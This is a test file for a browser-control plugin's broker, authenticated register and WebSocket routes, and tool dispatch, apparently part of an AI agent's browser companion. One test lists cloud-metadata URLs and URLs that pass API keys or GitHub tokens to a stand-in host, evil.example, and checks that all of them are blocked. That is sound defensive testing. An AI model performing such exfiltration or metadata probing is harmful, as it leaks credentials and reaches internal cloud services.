import test from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';

import { CONTROLLER_BROWSER_CAPABILITIES } from '../extension/lib/controller-protocol.mjs';

// Hermes Control inside the companion plugin: the broker, the register and socket
// routes, and the tools. These tests drive the real plugin code, the real aiohttp
// router and a real WebSocket to a fake controller, all in-process. They never
// start a gateway or open a socket to one (skipped when aiohttp is missing).

function runPython(script) {
  const result = spawnSync(process.env.PYTHON || 'python', ['-c', script], {
    cwd: process.cwd(),
    encoding: 'utf8',
  });
  assert.equal(result.status, 0, result.stderr || result.stdout);
  return result.stdout.trim().split('\n').pop();
}

const PRELUDE = `
import asyncio, importlib.util, json, pathlib, sys, tempfile, threading, time

root = pathlib.Path.cwd() / "companion-plugin"
spec = importlib.util.spec_from_file_location(
    "probe_plugin", root / "__init__.py", submodule_search_locations=[str(root)])
module = importlib.util.module_from_spec(spec)
module.__package__ = "probe_plugin"
sys.modules["probe_plugin"] = module
spec.loader.exec_module(module)
broker_module = sys.modules["probe_plugin.control_broker"]
routes = sys.modules["probe_plugin.control_routes"]
tools = sys.modules["probe_plugin.control_tools"]
schemas = sys.modules["probe_plugin.control_schemas"]

BASE = "/api/plugins/hermes-browser-companion"
REGISTER = BASE + "/control/register"
WS = BASE + "/control/ws"
TOKEN = "Bearer paired-token"
OTHER = "Bearer other-token"
PROTOCOL = "hermes-browser-control-v1"
CAPS = ["controller.noop", "browser_click", "browser_snapshot", "browser_navigate", "browser_screenshot", "browser_batch"]

class Adapter:
    sessions = None  # None: no session store; else a set of known session ids
    def _check_auth(self, request):
        from aiohttp import web
        if request.headers.get("Authorization") in (TOKEN, OTHER):
            return None
        return web.json_response({"error": {"code": "gateway_auth_failed"}}, status=401)

class StoreAdapter(Adapter):
    def __init__(self, known, db_ok=True):
        self.known, self.db_ok = known, db_ok
    async def _ensure_session_db_async(self):
        if not self.db_ok:
            return None
        known = self.known
        class Db:
            def get_session(self, session_id):
                return {"id": session_id} if session_id in known else None
        return Db()

class Clock:
    now = 1000.0
    def __call__(self):
        return self.now

def body(session="sess-A", controller="ctl-1", profile="bp-1", caps=CAPS, version=1):
    return {"protocol_version": version, "controller_id": controller, "browser_profile_id": profile,
            "session_id": session, "capabilities": caps}

async def make(adapter=None, **broker_kwargs):
    from aiohttp import web
    from aiohttp.test_utils import TestClient, TestServer
    broker = broker_module.ControlBroker(**broker_kwargs)
    app = web.Application()
    routes.make_wire_extra(broker, profile="luxord")(app.router, adapter or Adapter())
    shots = tempfile.mkdtemp(prefix="hbc-shots-")
    tools.configure(broker=broker, profile="luxord", screenshot_dir=shots)
    client = TestClient(TestServer(app))
    await client.start_server()
    return client, broker, shots

async def register(client, token=TOKEN, **kwargs):
    response = await client.post(REGISTER, headers={"Authorization": token}, json=body(**kwargs))
    return response.status, await response.json()

async def connect(client, ticket, protocols=None):
    protocols = protocols if protocols is not None else (PROTOCOL, "hermes-browser-control-ticket." + ticket)
    return await client.ws_connect(WS, protocols=protocols)

async def attach(client, broker, **kwargs):
    status, payload = await register(client, **kwargs)
    assert status == 201, payload
    ws = await connect(client, payload["ticket"])
    for _ in range(150):
        scopes = broker.lane_scopes(profile_id="luxord", session_id=kwargs.get("session", "sess-A"))
        if any(s.controller_id == kwargs.get("controller", "ctl-1") and broker._controllers[s].connected for s in scopes):
            break
        await asyncio.sleep(0.02)
    return ws, payload

def call(action, args=None, session="sess-A"):
    """The tool handler, run in a worker thread as Hermes runs it."""
    return asyncio.to_thread(tools.run_control_action, action, args if args is not None else {}, {"session_id": session, "task_id": "task-1"})

async def refused(awaitable):
    try:
        await awaitable
    except Exception as error:
        return getattr(error, "status", type(error).__name__)
    return None
`;

const SKIP_GUARD = `
try:
    import aiohttp  # noqa: F401
except ImportError:
    print(json.dumps({"skipped": True}))
    raise SystemExit(0)
`;

function skipped(data) {
  return data && data.skipped === true;
}

test('the Hermes Control tools, schemas, broker actions and the extension capabilities are the same twenty actions', () => {
  const out = runPython(`${PRELUDE}
print(json.dumps({"actions": list(broker_module.CONTROL_ACTIONS), "schemas": sorted(schemas.CONTROL_SCHEMAS),
                  "tools": list(tools.TOOL_NAMES), "caps": sorted(broker_module.CONTROL_CAPABILITIES),
                  "names": [schemas.CONTROL_SCHEMAS[name]["name"] for name in broker_module.CONTROL_ACTIONS],
                  "descriptions": [schemas.CONTROL_SCHEMAS[name]["description"] for name in broker_module.CONTROL_ACTIONS],
                  "types": [schemas.CONTROL_SCHEMAS[name]["parameters"]["type"] for name in broker_module.CONTROL_ACTIONS]}))
`);
  const data = JSON.parse(out);
  assert.deepEqual([...data.actions].sort(), [...CONTROLLER_BROWSER_CAPABILITIES].sort());
  assert.deepEqual(data.schemas, [...data.actions].sort());
  assert.deepEqual(data.tools, data.actions);
  assert.deepEqual(data.names, data.actions);
  assert.deepEqual(data.caps, ['controller.noop', ...data.actions].sort());
  assert.equal(data.actions.length, 20);
  for (const description of data.descriptions) {
    assert.match(description, /person's own browser through the Hermes Browser extension/);
    assert.match(description, /separate from browser_exec/);
  }
  for (const type of data.types) assert.equal(type, 'object');
  // Raw CDP and page evaluation are not a capability the broker will accept.
  for (const name of ['browser_cdp', 'browser_evaluate', 'browser_exec', 'browser_artifact_download', 'browser_artifact_upload']) {
    assert.ok(!data.caps.includes(name), name);
  }
});

test('register() offers the tools only while a controller is attached, and a name another toolset owns is left alone', () => {
  const out = runPython(`${PRELUDE}
class Ctx:
    profile_name = "luxord"
    def __init__(self, owned=()):
        self.registered, self.owned = {}, set(owned)
    def get_config(self, key, default=None): return default
    def register_tool(self, name, toolset, schema, handler, check_fn=None, description="", emoji="", **kwargs):
        if name in self.owned:
            return None  # what Hermes does for a name another toolset owns
        self.registered[name] = {"toolset": toolset, "check_fn": check_fn, "handler": handler, "schema": schema}
    def register_hook(self, name, callback): pass
    def register_skill(self, name, path): pass

ctx = Ctx(owned=["browser_click"])
module.register(ctx)
control = {name: entry for name, entry in ctx.registered.items() if name in broker_module.CONTROL_ACTIONS}
broker = broker_module.get_control_broker()
before = tools.control_available()
scope = broker_module.ControllerScope(principal_id="p", profile_id="luxord", session_id="sess-A", controller_id="c",
                                      browser_profile_id="b", transport_family="local-api", capabilities=frozenset(CAPS))
broker.attach(scope, lambda frame: None, owner=object())
during = tools.control_available()
checks = {name: entry["check_fn"]() for name, entry in control.items()}
broker.reset()
print(json.dumps({"count": len(control), "skipped_owned": "browser_click" not in control, "toolsets": sorted({e["toolset"] for e in control.values()}),
                  "before": before, "during": during, "checks": sorted(set(checks.values())), "after": tools.control_available(),
                  "schemas_ok": all(e["schema"]["name"] == name for name, e in control.items())}))
`);
  const data = JSON.parse(out);
  assert.equal(data.count, 19);
  assert.equal(data.skipped_owned, true);
  assert.deepEqual(data.toolsets, ['hermes-browser-companion']);
  assert.equal(data.before, false);
  assert.equal(data.during, true);
  assert.deepEqual(data.checks, [true]);
  assert.equal(data.after, false);
  assert.equal(data.schemas_ok, true);
});

test('both routes refuse without the API server auth, a registration is validated, and capabilities are filtered', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
class Raising:
    def _check_auth(self, request): raise RuntimeError("boom")
class NoCheck: pass

async def main():
    seen = {}
    client, broker, _ = await make()
    async with client:
        anonymous = await client.post(REGISTER, json=body())
        wrong = await client.post(REGISTER, headers={"Authorization": "Bearer nope"}, json=body())
        seen["unauthenticated"] = [anonymous.status, wrong.status]
        seen["get_register"] = (await client.get(REGISTER, headers={"Authorization": TOKEN})).status
        seen["post_ws"] = (await client.post(WS, headers={"Authorization": TOKEN})).status
        bad = {}
        for label, payload in {
            "not_object": [1, 2], "protocol_2": body(version=2), "protocol_true": body(version=True), "protocol_str": body(version="1"),
            "no_controller": body(controller=""), "no_profile": body(profile=" "), "no_session": body(session=""),
            "long_session": body(session="s" * 257), "control_char": body(session="a\\x01b"),
            "caps_not_list": body(caps="browser_click"), "caps_empty": body(caps=[]),
            "caps_unknown_only": body(caps=["browser_cdp", "browser_evaluate", "browser_exec", "browser_artifact_upload"]),
        }.items():
            response = await client.post(REGISTER, headers={"Authorization": TOKEN}, json=payload)
            bad[label] = [response.status, (await response.json())["error"]["code"]]
        seen["bad"] = bad
        text = await client.post(REGISTER, headers={"Authorization": TOKEN}, data="not json")
        seen["not_json"] = text.status
        huge = await client.post(REGISTER, headers={"Authorization": TOKEN}, data="x" * 70_000)
        seen["huge"] = huge.status
        ok = await client.post(REGISTER, headers={"Authorization": TOKEN}, json=body(caps=CAPS + ["browser_cdp", "browser_evaluate", 7, None]))
        seen["ok_status"] = ok.status
        seen["cache"] = ok.headers.get("Cache-Control")
        seen["ok"] = await ok.json()
        seen["tickets_minted"] = len(broker._tickets)
    for label, adapter in (("raising", Raising()), ("nocheck", NoCheck())):
        client, _, _ = await make(adapter)
        async with client:
            seen[label] = (await client.post(REGISTER, headers={"Authorization": TOKEN}, json=body())).status
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  assert.deepEqual(data.unauthenticated, [401, 401]);
  assert.equal(data.get_register, 405);
  assert.equal(data.post_ws, 405);
  assert.equal(data.raising, 401);
  assert.equal(data.nocheck, 401);
  for (const [label, [status]] of Object.entries(data.bad)) assert.equal(status, 400, label);
  assert.equal(data.bad.protocol_true[1], 'browser_control_protocol_unsupported');
  assert.equal(data.bad.caps_unknown_only[1], 'browser_control_no_capabilities');
  assert.equal(data.bad.no_session[1], 'browser_control_invalid_registration');
  assert.equal(data.not_json, 400);
  assert.equal(data.huge, 413);
  assert.equal(data.ok_status, 201);
  assert.equal(data.cache, 'no-store');
  assert.equal(data.tickets_minted, 1, 'only the valid registration minted a ticket');
  assert.equal(data.ok.protocol_version, 1);
  assert.equal(data.ok.ws_path, '/api/plugins/hermes-browser-companion/control/ws');
  assert.equal(data.ok.ticket_expires_in_seconds, 30);
  assert.match(data.ok.ticket, /^[A-Za-z0-9_-]{30,}$/);
  assert.deepEqual(data.ok.scope.capabilities, ['browser_batch', 'browser_click', 'browser_navigate', 'browser_screenshot', 'browser_snapshot', 'controller.noop']);
  assert.equal(data.ok.scope.profile_id, 'luxord');
  assert.equal(data.ok.scope.transport_family, 'local-api');
  assert.match(data.ok.scope.principal_id, /^principal:luxord:[0-9a-f]{32}$/);
  assert.ok(!JSON.stringify(data.ok.scope).includes('paired-token'));
});

test('through the real factory, register and the socket both refuse an unauthenticated or ticketless caller', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
class Ctx:
    profile_name = "luxord"
    def __init__(self): self.factories = []
    def get_config(self, key, default=None): return default
    def register_tool(self, *args, **kwargs): pass
    def register_hook(self, name, callback): pass
    def register_skill(self, name, path): pass
    def register_platform_handler(self, platform, factory): self.factories.append((platform, factory))

async def main():
    from aiohttp import web
    from aiohttp.test_utils import TestClient, TestServer
    ctx = Ctx()
    module.register(ctx)
    app = web.Application()
    ctx.factories[0][1](app, Adapter())
    seen = {}
    async with TestClient(TestServer(app)) as client:
        seen["register"] = [(await client.post(REGISTER, json=body())).status,
                            (await client.post(REGISTER, headers={"Authorization": "Bearer nope"}, json=body())).status]
        seen["ws_plain"] = await refused(client.ws_connect(WS))
        listing = await client.get(BASE + "/status", headers={"Authorization": TOKEN})
        seen["routes"] = (await listing.json())["routes"]
        seen["tools"] = (await listing.json())["tools"]
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  assert.deepEqual(data.register, [401, 401]);
  assert.equal(data.ws_plain, 401);
  assert.ok(data.routes.includes('/api/plugins/hermes-browser-companion/control/register'));
  assert.ok(data.routes.includes('/api/plugins/hermes-browser-companion/control/ws'));
  for (const name of CONTROLLER_BROWSER_CAPABILITIES) assert.ok(data.tools.includes(name), name);
});

test('the socket takes a ticket only from the subprotocol, exactly once, and not after it expires', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
async def main():
    seen = {}
    clock = Clock()
    client, broker, _ = await make(clock=clock)
    async with client:
        _, first = await register(client)
        ticket = first["ticket"]
        seen["no_protocols"] = await refused(client.ws_connect(WS))
        seen["only_version"] = await refused(connect(client, ticket, protocols=(PROTOCOL,)))
        seen["only_ticket"] = await refused(connect(client, ticket, protocols=("hermes-browser-control-ticket." + ticket,)))
        seen["wrong_ticket"] = await refused(connect(client, "not-a-ticket"))
        seen["empty_ticket"] = await refused(connect(client, "", protocols=(PROTOCOL, "hermes-browser-control-ticket.")))
        seen["two_tickets"] = await refused(connect(client, ticket, protocols=(PROTOCOL, "hermes-browser-control-ticket." + ticket, "hermes-browser-control-ticket." + ticket)))
        seen["query_ticket"] = await refused(client.ws_connect(WS + "?ticket=" + ticket, protocols=(PROTOCOL, "hermes-browser-control-ticket." + ticket)))
        seen["untouched"] = broker.pending_count == 0 and not broker.any_connected()
        ws = await connect(client, ticket)
        seen["negotiated"] = ws.protocol
        for _ in range(100):
            if broker.any_connected(): break
            await asyncio.sleep(0.02)
        seen["attached"] = broker.any_connected()
        seen["reuse"] = await refused(connect(client, ticket))
        await ws.close()
        _, second = await register(client, session="sess-B")
        clock.now += 31
        seen["expired"] = await refused(connect(client, second["ticket"]))
        _, third = await register(client, session="sess-B")
        clock.now += 29
        late = await connect(client, third["ticket"])
        seen["just_in_time"] = late.protocol
        await late.close()
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  for (const label of ['no_protocols', 'only_version', 'only_ticket', 'wrong_ticket', 'empty_ticket', 'two_tickets', 'query_ticket', 'reuse', 'expired']) {
    assert.equal(data[label], 401, label);
  }
  assert.equal(data.untouched, true, 'a refused attempt neither attached nor consumed the ticket');
  assert.equal(data.negotiated, 'hermes-browser-control-v1');
  assert.equal(data.attached, true);
  assert.equal(data.just_in_time, 'hermes-browser-control-v1');
});

test('a tool call reaches a connected fake controller over the real WebSocket and completes', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
async def main():
    seen = {}
    client, broker, shots = await make()
    async with client:
        ws, registered = await attach(client, broker)
        # a heartbeat is echoed, and a result for an unknown command is ignored
        await ws.send_json({"method": "browser.controller.heartbeat", "params": {"nonce": "n-1"}})
        seen["heartbeat"] = await ws.receive_json(timeout=3)
        await ws.send_json({"method": "browser.controller.result", "params": {"command_id": "nope", "ok": True, "result": "x"}})

        task = asyncio.create_task(call("browser_click", {"ref": "@e5", "tab_id": 3}))
        frame = await ws.receive_json(timeout=5)
        seen["frame"] = frame
        await ws.send_json({"method": "browser.controller.result", "params": {
            "command_id": frame["params"]["command_id"], "tab_id": 3, "ok": True, "result": {"status": "clicked", "title": "Docs"}}})
        seen["ok_result"] = json.loads(await task)

        task = asyncio.create_task(call("browser_snapshot", {}))
        frame = await ws.receive_json(timeout=5)
        await ws.send_json({"method": "browser.controller.result", "params": {"command_id": frame["params"]["command_id"], "ok": True, "result": "PAGE SNAPSHOT"}})
        seen["string_result"] = await task

        task = asyncio.create_task(call("browser_click", {"ref": "@e9"}))
        frame = await ws.receive_json(timeout=5)
        await ws.send_json({"method": "browser.controller.result", "params": {
            "command_id": frame["params"]["command_id"], "ok": False, "error": {"code": "lease_required", "message": "That tab is not attached."}}})
        seen["refused"] = json.loads(await task)

        image = "data:image/png;base64,iVBORw0KGgo="
        task = asyncio.create_task(call("browser_screenshot", {}))
        frame = await ws.receive_json(timeout=5)
        await ws.send_json({"method": "browser.controller.result", "params": {
            "command_id": frame["params"]["command_id"], "ok": True, "result": {"status": "captured", "dataUrl": image}}})
        shot = json.loads(await task)
        seen["shot"] = {key: value for key, value in shot.items() if key not in ("screenshot_path", "media")}
        import os, pathlib
        path = pathlib.Path(shot["screenshot_path"])
        seen["shot_file"] = [path.parent == pathlib.Path(shots), path.read_bytes()[:4].hex(), shot["media"] == "MEDIA:" + str(path), image in json.dumps(shot)]

        task = asyncio.create_task(call("browser_screenshot", {}))
        frame = await ws.receive_json(timeout=5)
        await ws.send_json({"method": "browser.controller.result", "params": {
            "command_id": frame["params"]["command_id"], "ok": True, "result": {"status": "captured", "dataUrl": "data:text/html;base64,AAAA"}}})
        seen["bad_shot"] = json.loads(await task)["code"]

        # detach: the controller leaves, and the lane is gone
        await ws.send_json({"method": "browser.controller.detach", "params": {}})
        seen["detach_reply"] = await ws.receive_json(timeout=3)
        seen["lane_after_detach"] = len(broker.lane_scopes(profile_id="luxord", session_id="sess-A"))
        await ws.close()
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  assert.deepEqual(data.heartbeat, { method: 'browser.controller.heartbeat', params: { nonce: 'n-1', ok: true } });
  assert.equal(data.frame.method, 'browser.controller.command');
  assert.equal(data.frame.params.action, 'browser_click');
  assert.deepEqual(data.frame.params.arguments, { ref: '@e5', tab_id: 3 });
  assert.equal(data.frame.params.controller_id, 'ctl-1');
  assert.equal(data.frame.params.browser_profile_id, 'bp-1');
  assert.match(data.frame.params.command_id, /^[0-9a-f]{32}$/);
  assert.deepEqual(data.ok_result, { status: 'clicked', title: 'Docs' });
  assert.equal(data.string_result, 'PAGE SNAPSHOT');
  assert.deepEqual(data.refused, { success: false, error: 'That tab is not attached.', code: 'lease_required' });
  assert.deepEqual(data.shot, { status: 'captured' });
  assert.deepEqual(data.shot_file, [true, '89504e47', true, false]);
  assert.equal(data.bad_shot, 'screenshot_unavailable');
  assert.deepEqual(data.detach_reply, { method: 'browser.controller.detach', params: { ok: true } });
  assert.equal(data.lane_after_detach, 0);
});

test('a command that is not answered times out and is cancelled on the controller, and the extension can cancel one', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
async def main():
    seen = {}
    client, broker, _ = await make(command_timeout=0.4)
    async with client:
        ws, _ = await attach(client, broker)
        task = asyncio.create_task(call("browser_snapshot", {}))
        command = await ws.receive_json(timeout=5)
        started = time.monotonic()
        seen["timeout"] = json.loads(await task)
        seen["waited"] = round(time.monotonic() - started, 1)
        cancel = await ws.receive_json(timeout=5)
        seen["cancel_frame"] = [cancel["method"], cancel["params"]["command_id"] == command["params"]["command_id"]]
        seen["pending_after_timeout"] = broker.pending_count
        # a late answer to the timed-out command resolves nothing
        await ws.send_json({"method": "browser.controller.result", "params": {"command_id": command["params"]["command_id"], "ok": True, "result": "late"}})

        # the extension cancels a command by its tool call id
        scope = broker.scope_for_session(profile_id="luxord", session_id="sess-A")
        def dispatch():
            try:
                broker._command_timeout = 10
                return broker.dispatch(scope, action="browser_click", arguments={"ref": "@e1"}, tool_call_id="call-7")
            except Exception as error:
                return type(error).__name__
        task = asyncio.create_task(asyncio.to_thread(dispatch))
        command = await ws.receive_json(timeout=5)
        seen["tool_call_id_on_wire"] = command["params"]["tool_call_id"]
        await ws.send_json({"method": "browser.controller.cancel", "params": {"tool_call_id": "call-7"}})
        seen["cancelled"] = await asyncio.wait_for(task, 5)
        echoed = await ws.receive_json(timeout=5)
        seen["echo"] = [echoed["method"], echoed["params"]["tool_call_id"]]

        # a socket that drops while a command is pending leaves it pending (an offline controller can reconnect)
        broker._command_timeout = 0.3
        task = asyncio.create_task(call("browser_snapshot", {}))
        await ws.receive_json(timeout=5)
        await ws.close()
        seen["after_drop"] = json.loads(await asyncio.wait_for(task, 5))["code"]
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  assert.equal(data.timeout.code, 'timeout');
  assert.match(data.timeout.error, /take a snapshot before repeating/);
  assert.ok(data.waited >= 0.3 && data.waited < 3, String(data.waited));
  assert.deepEqual(data.cancel_frame, ['browser.controller.cancel', true]);
  assert.equal(data.pending_after_timeout, 0);
  assert.equal(data.tool_call_id_on_wire, 'call-7');
  assert.equal(data.cancelled, 'ControllerCancelled');
  assert.deepEqual(data.echo, ['browser.controller.cancel', 'call-7']);
  assert.equal(data.after_drop, 'timeout');
});

test('with no controller a tool fails soft, never raises, and a call can reach only its own session and profile', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
def code(text):
    return json.loads(text)["code"]

async def main():
    seen = {}
    client, broker, _ = await make()
    async with client:
        none = tools.run_control_action("browser_click", {"ref": "@e1"}, {"session_id": "sess-A"})
        seen["none"] = json.loads(none)
        seen["none_ok_flag"] = seen["none"]["success"]
        seen["weird_args"] = [code(tools.run_control_action("browser_snapshot", weird, {"session_id": "sess-A"})) for weird in (None, [1], "x", 5)]
        seen["no_session"] = [code(tools.run_control_action("browser_snapshot", {}, kwargs)) for kwargs in (None, {}, {"session_id": ""}, {"session_id": None})]
        seen["handler_signature"] = code(tools.make_handler("browser_snapshot")(None, session_id="sess-A", task_id="t", user_task="x"))
        seen["unknown_action_guard"] = code(tools.make_handler("browser_back")({}, session_id="sess-A"))

        ws, _ = await attach(client, broker, session="sess-A")
        # a controller for sess-A is not reachable from sess-B, nor with a model-supplied session id
        seen["other_session"] = code(tools.run_control_action("browser_snapshot", {}, {"session_id": "sess-B"}))
        seen["args_cannot_pick"] = code(tools.run_control_action("browser_snapshot", {"session_id": "sess-A"}, {"session_id": "sess-B"}))
        tools.configure(broker=broker, profile="someone-else", screenshot_dir=None)
        seen["other_profile"] = code(tools.run_control_action("browser_snapshot", {}, {"session_id": "sess-A"}))
        tools.configure(broker=broker, profile="luxord", screenshot_dir=None)
        seen["nothing_sent"] = False
        try:
            await ws.receive(timeout=0.3)
        except asyncio.TimeoutError:
            seen["nothing_sent"] = True

        # a capability the controller did not negotiate is unavailable, not guessed
        ws2, _ = await attach(client, broker, session="sess-C", controller="ctl-2", caps=["controller.noop", "browser_snapshot"])
        seen["not_negotiated"] = code(tools.run_control_action("browser_click", {"ref": "@e1"}, {"session_id": "sess-C"}))
        await ws2.close()
        await ws.close()
        for _ in range(100):
            if not broker.any_connected(): break
            await asyncio.sleep(0.02)
        seen["offline"] = code(tools.run_control_action("browser_snapshot", {}, {"session_id": "sess-A"}))
        seen["available_after"] = tools.control_available()
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  assert.equal(data.none.code, 'no_browser');
  assert.equal(data.none_ok_flag, false);
  assert.match(data.none.error, /No browser is connected for this session/);
  assert.deepEqual(data.weird_args, ['no_browser', 'no_browser', 'no_browser', 'no_browser']);
  assert.deepEqual(data.no_session, ['no_session', 'no_session', 'no_session', 'no_session']);
  assert.equal(data.handler_signature, 'no_browser');
  assert.equal(data.unknown_action_guard, 'no_browser');
  assert.equal(data.other_session, 'no_browser');
  assert.equal(data.args_cannot_pick, 'no_browser');
  assert.equal(data.other_profile, 'no_browser');
  assert.equal(data.nothing_sent, true, 'the controller of another session saw no command');
  assert.equal(data.not_negotiated, 'browser_unavailable');
  assert.equal(data.offline, 'browser_unavailable');
  assert.equal(data.available_after, false);
});

test('two controllers in one session lane are never guessed between, and an older socket cannot detach a newer one', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
def code(text):
    return json.loads(text)["code"]

async def main():
    seen = {}
    client, broker, _ = await make()
    async with client:
        # the same controller reconnects: the new socket replaces the old, and the old closing detaches nothing
        old, _ = await attach(client, broker)
        scope = broker.lane_scopes(profile_id="luxord", session_id="sess-A")[0]
        old_owner = broker._controllers[scope].owner
        _, again = await register(client)
        new = await connect(client, again["ticket"])
        for _ in range(100):
            await asyncio.sleep(0.02)
            if broker._controllers[scope].owner is not old_owner and broker._controllers[scope].connected:
                break
        await old.close()
        await asyncio.sleep(0.2)
        seen["reconnect_lane"] = len(broker.lane_scopes(profile_id="luxord", session_id="sess-A"))
        seen["reconnect_connected"] = broker.any_connected()
        task = asyncio.create_task(call("browser_snapshot", {}))
        frame = await new.receive_json(timeout=5)
        await new.send_json({"method": "browser.controller.result", "params": {"command_id": frame["params"]["command_id"], "ok": True, "result": "on the new socket"}})
        seen["served_by_new"] = await task

        # a different controller in the same lane hard-replaces it
        other, _ = await attach(client, broker, controller="ctl-2", profile="bp-2")
        seen["replaced_lane"] = [scope.controller_id for scope in broker.lane_scopes(profile_id="luxord", session_id="sess-A")]

        # a different credential is a different principal: two lanes, so no guess
        third, _ = await attach(client, broker, token=OTHER, controller="ctl-3")
        seen["two_principals"] = len(broker.lane_scopes(profile_id="luxord", session_id="sess-A"))
        seen["ambiguous"] = code(tools.run_control_action("browser_snapshot", {}, {"session_id": "sess-A"}))
        seen["scope_for_session"] = broker.scope_for_session(profile_id="luxord", session_id="sess-A") is None
        for socket in (new, other, third):
            await socket.close()
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  assert.equal(data.reconnect_lane, 1);
  assert.equal(data.reconnect_connected, true);
  assert.equal(data.served_by_new, 'on the new socket');
  assert.deepEqual(data.replaced_lane, ['ctl-2']);
  assert.equal(data.two_principals, 2);
  assert.equal(data.ambiguous, 'ambiguous_browser');
  assert.equal(data.scope_for_session, true);
});

test('registration for a session the server does not know is refused, and an unavailable session store fails closed', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
async def main():
    seen = {}
    client, _, _ = await make(StoreAdapter({"sess-A"}))
    async with client:
        known = await client.post(REGISTER, headers={"Authorization": TOKEN}, json=body(session="sess-A"))
        ghost = await client.post(REGISTER, headers={"Authorization": TOKEN}, json=body(session="sess-ghost"))
        seen["known"] = known.status
        seen["ghost"] = [ghost.status, (await ghost.json())["error"]["code"]]
    client, _, _ = await make(StoreAdapter({"sess-A"}, db_ok=False))
    async with client:
        unavailable = await client.post(REGISTER, headers={"Authorization": TOKEN}, json=body(session="sess-A"))
        seen["unavailable"] = [unavailable.status, (await unavailable.json())["error"]["code"]]
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  assert.equal(data.known, 201);
  assert.deepEqual(data.ghost, [403, 'browser_control_session_forbidden']);
  assert.deepEqual(data.unavailable, [503, 'session_db_unavailable']);
});

test('a URL with a secret or a cloud-metadata address is refused before anything is sent, and arguments are checked', () => {
  const out = runPython(`${PRELUDE}${SKIP_GUARD}
def code(text):
    value = json.loads(text)
    return value.get("code") if isinstance(value, dict) else "result"

async def main():
    seen = {}
    client, broker, _ = await make()
    async with client:
        ws, _ = await attach(client, broker)
        blocked = {
            "metadata_ip": ("browser_navigate", {"url": "http://169.254.169.254/latest/meta-data/"}),
            "metadata_host": ("browser_tab_create", {"url": "http://metadata.google.internal./computeMetadata/v1/"}),
            "metadata_v6": ("browser_navigate", {"url": "http://[fd00:ec2::254]/latest/"}),
            "secret": ("browser_navigate", {"url": "https://evil.example/?k=sk-abcdefghijklmnopqrstuvwxyz123456"}),
            "secret_encoded": ("browser_navigate", {"url": "https://evil.example/?k=sk%2Dabcdefghijklmnopqrstuvwxyz123456"}),
            "github_token": ("browser_tab_create", {"url": "https://evil.example/ghp_" + "a" * 36}),
            "batch_step": ("browser_batch", {"actions": [{"action": "click", "ref": "@e1"}, {"action": "navigate", "url": "http://169.254.169.254/"}]}),
        }
        seen["blocked"] = {label: code(tools.run_control_action(action, args, {"session_id": "sess-A"})) for label, (action, args) in blocked.items()}
        seen["batch_message"] = json.loads(tools.run_control_action(*blocked["batch_step"], {"session_id": "sess-A"}))["error"]
        seen["invalid"] = {
            "click_empty": code(tools.run_control_action("browser_click", {}, {"session_id": "sess-A"})),
            "click_x_only": code(tools.run_control_action("browser_click", {"x": 4}, {"session_id": "sess-A"})),
            "navigate_no_url": code(tools.run_control_action("browser_navigate", {}, {"session_id": "sess-A"})),
            "type_no_text": code(tools.run_control_action("browser_type", {"ref": "@e1"}, {"session_id": "sess-A"})),
        }
        try:
            await ws.receive(timeout=0.3)
            seen["sent_nothing"] = False
        except asyncio.TimeoutError:
            seen["sent_nothing"] = True

        # a local or private address is the person's own to open, and a valid call goes through
        task = asyncio.create_task(call("browser_navigate", {"url": "http://127.0.0.1:3000/"}))
        frame = await ws.receive_json(timeout=5)
        seen["local_action"] = [frame["params"]["action"], frame["params"]["arguments"]]
        await ws.send_json({"method": "browser.controller.result", "params": {"command_id": frame["params"]["command_id"], "ok": True, "result": {"status": "navigated"}}})
        seen["local_result"] = json.loads(await task)
        task = asyncio.create_task(call("browser_click", {"x": 4, "y": 9}))
        frame = await ws.receive_json(timeout=5)
        await ws.send_json({"method": "browser.controller.result", "params": {"command_id": frame["params"]["command_id"], "ok": True, "result": {"status": "clicked"}}})
        seen["coordinate_click"] = json.loads(await task)
        await ws.close()
    return seen

print(json.dumps(asyncio.run(main())))
`);
  const data = JSON.parse(out);
  if (skipped(data)) return;
  for (const [label, outcome] of Object.entries(data.blocked)) assert.equal(outcome, 'url_blocked', label);
  assert.match(data.batch_message, /step 2 \(navigate\).*Nothing was run/);
  for (const [label, outcome] of Object.entries(data.invalid)) assert.equal(outcome, 'invalid_arguments', label);
  assert.equal(data.sent_nothing, true);
  assert.deepEqual(data.local_action, ['browser_navigate', { url: 'http://127.0.0.1:3000/' }]);
  assert.deepEqual(data.local_result, { status: 'navigated' });
  assert.deepEqual(data.coordinate_click, { status: 'clicked' });
});

test('the broker keeps its contract: tickets, replacement, single completion, owner-aware teardown, deferred cancels', () => {
  const out = runPython(`${PRELUDE}
B = broker_module
def scope(session="s", controller="c", caps=("controller.noop", "browser_click")):
    return B.ControllerScope(principal_id="p", profile_id="prof", session_id=session, controller_id=controller,
                             browser_profile_id="bp", transport_family="local-api", capabilities=frozenset(caps))

seen = {}
clock = Clock()
broker = B.ControlBroker(clock=clock, command_timeout=0.3)
seen["protocol"] = [B.protocol_supported(1), B.protocol_supported(True), B.protocol_supported("1"), B.protocol_supported(2), B.protocol_supported(1.0)]
seen["filter"] = sorted(B.filter_capabilities(["browser_click", "browser_cdp", 3, "controller.noop", None]))
